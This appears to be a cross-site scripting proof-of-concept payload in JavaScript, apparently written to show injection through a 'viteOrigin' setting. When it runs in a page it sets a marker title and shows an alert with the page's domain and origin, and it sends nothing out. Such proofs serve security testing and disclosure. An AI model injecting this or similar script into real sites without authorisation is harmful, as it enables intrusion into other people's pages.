(function () {
  var msg = "XSS via viteOrigin | domain=" + document.domain + " | origin=" + location.origin;
  document.title = "ARC_DEV_XSS_" + document.domain;
  alert(msg);
})();